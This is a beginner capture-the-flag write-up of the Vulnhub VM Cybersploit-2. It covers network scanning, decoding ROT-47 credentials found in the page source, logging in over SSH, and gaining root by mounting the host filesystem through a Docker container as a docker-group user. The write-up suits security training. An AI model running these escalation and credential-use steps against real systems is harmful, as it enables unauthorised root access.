---
title: Vulnhub - Cybersploit-2 | EN
author: batmanly
date: 2023-03-15 10:10:00 +3
categories: [Writeup, Vulnhub, Cybersploit]
tags: [web, writeup, rot-47, docker, previlege_escalation, cybersploit-2]
render_with_liquid: false
---

# Information

-   **Name:** `Cybersploit-2`
-   **Profile:** [`Cybersploit-2`](https://www.vulnhub.com/entry/cybersploit-2,511/)
-   **Difficulty:** Easy
-   **Description**: THIS IS A MACHINE FOR COMPLETE BEGINNER , THERE ARE THREE FALGS AVAILABLE IN THIS VM. FROM THIS VMs YOU WILL LEARN ABOUT ENCODER-DECODER & EXPLOIT-DB.

# Write-up

## Overview
It’s a nice room , you can learn encoding/decoding and privilege escalation with docker.

## Network enumeration

let's start finding ip address of the machine than we will enumeration port and services with Nmap.

```bash
sudo arp-scan -l -I vboxnet0
```
![[]](/assets/img/vulnhub/cybersploit/cybersploit-2/img.png)

### Port and service scan with Nmap:
after finding ip of our cybersploit-2 machine we can now start scanning network.
```bash
sudo nmap -sV -T4 -sS -v -Pn -p- 192.168.56.103 -sC -oN nmap3 
```

we found there is 2 port is open , let's enumerate web services and if there is a weakness we will exploit this vulnerabilities.
```
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 ad6d15e744e97bb85909195cbdd66b10 (RSA)
|   256 d6d5b45d8df95e6f3a31ad8180349b12 (ECDSA)
|_  256 69794f8c90e9436c17f731e8ff870531 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-title: CyberSploit2
|_http-server-header: Apache/2.4.37 (centos)
MAC Address: 08:00:27:2B:42:7D (Oracle VirtualBox virtual NIC)

```

## Web enumeration

let's look website. after i started searching website inside view-source i found hint `rot-47` so after that i started looking something similar rot-47 encoding .

```
view-source:http://192.168.56.103/
```
![[]](/assets/img/vulnhub/cybersploit/cybersploit-2/img_1.png)

on the page there is table username and password , we could also try to brute force with this username and passwords but realize there is something rot 47 encoding , so i try to decode this string with rot-47 decoder website.
![[]](/assets/img/vulnhub/cybersploit/cybersploit-2/img_2.png)

after copy and paste the username and password i found on the web page i get a decoded username and password for login with ssh.

```
D92:=6?5C2

4J36CDA=@:E`
```

![[]](/assets/img/vulnhub/cybersploit/cybersploit-2/img_3.png)

```
shailendra     cybersploit1
```

### Login with ssh
i successfully reach the shell with founded credentials. there is also hint about docker so let's investigate docker privilege escalation steps.
![[]](/assets/img/vulnhub/cybersploit/cybersploit-2/img_4.png)


## Privilege Escalation
### Elevation of Privilege : User to Root with docker

after finding hint i started looking around and i found that user is in docker group so we can use docker group and get shell as a root.

![[]](/assets/img/vulnhub/cybersploit/cybersploit-2/img_5.png)

because we don't have internet access on cybersploit-2 i will download alpine image on my local and save it , then upload it and load on cybersploit-2 machine , than try to get shell .

let's give a try.

### Download alpine and upload server for privilege escalation

we can download alpine by this command the latest version
```bash
docker pull alpine
```

![[]](/assets/img/vulnhub/cybersploit/cybersploit-2/img_6.png)

let's save alpine image .
```bash
sudo docker save -o alpine.docker alpine
```

now let's upload this image our cybersploit-2 machine than load.
```bash
updog -p 8000
```

```bash
curl -O http://192.168.56.1:8000/alpine.docker
```

load image inside docker

```bash
docker load -i alpine.docker
```

i tried this way but i got error ,
![[]](/assets/img/vulnhub/cybersploit/cybersploit-2/img_7.png)

so i connected machine to internet for access docker.io and dowlonad alpine image for us , then we can get shell over the docker .

### Change host adapter to Nat adapter
just go settings and add  another adapter .

![[]](/assets/img/vulnhub/cybersploit/cybersploit-2/img_8.png)



after that we can get shell with docker.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![[]](/assets/img/vulnhub/cybersploit/cybersploit-2/img_9.png)

![[]](/assets/img/vulnhub/cybersploit/cybersploit-2/root.gif)
Yep. Now we Got root. Thanks for reading until the end , if you have any feedback i will appreciate to get , knowing different ways to get root always good for me.
